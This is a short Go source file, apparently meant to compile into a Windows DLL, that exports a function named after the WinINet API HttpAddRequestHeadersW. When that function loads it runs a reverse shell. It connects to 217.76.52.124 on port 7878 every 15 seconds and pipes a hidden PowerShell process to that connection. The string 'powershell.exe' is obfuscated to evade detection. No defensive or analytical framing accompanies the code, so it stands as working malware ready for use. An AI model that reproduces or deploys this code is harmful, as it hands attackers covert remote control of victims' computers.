package main

import (
	"net"
	"os/exec"
	"syscall"
	"time"
	"fmt"
	"strings"
)

import "C"

//export HttpAddRequestHeadersW
func HttpAddRequestHeadersW() {
	for {
		time.Sleep(15 * time.Second)

		dialer := net.Dialer{
				Timeout: 5 * time.Second,
		}

		conn, err := dialer.Dial("tcp", "217.76.52.124:7878")

		if err != nil {
				continue
		}

		// cmd := exec.Command("powershell.exe")
		cmd := exec.Command(strings.ToLower(fmt.Sprintf("%s%s%s%s", "Po", "wEr", "sHEL", "l.exE")))

		// hides PowerShell window after command execution
		cmd.SysProcAttr = &syscall.SysProcAttr{
				HideWindow: true,
		}

		cmd.Stdin = conn
		cmd.Stdout = conn
		cmd.Stderr = conn
		cmd.Run()
}
}

func main() {}